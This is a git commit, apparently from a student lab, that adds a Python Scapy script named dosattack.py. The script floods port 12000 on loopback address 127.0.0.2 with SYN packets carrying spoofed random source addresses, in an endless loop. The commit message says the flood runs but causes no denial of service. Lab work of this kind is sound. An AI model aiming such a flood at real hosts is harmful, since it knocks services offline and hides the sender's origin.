565d8c78f6208137d61af8fd676a7f0ce1700953
Kolbe <kolbelb4@gmail.com>
2022-09-07 10:54:27 -0500

    dos attack still not working. syn flood but no dos.

---
+++ Lab1/Part1/dosattack.py
@@ -0,0 +1,12 @@
+from scapy.all import *
+def main():
+    target_ip = "127.0.0.2"
+    target_port = 12000
+    ip = IP(src=RandIP(), dst=target_ip)
+    tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
+    raw = Raw(b"X"*1024)
+    p = ip / tcp / raw
+    send(p, loop=1, verbose=0)
+
+if __name__ == "__main__":
+    main()
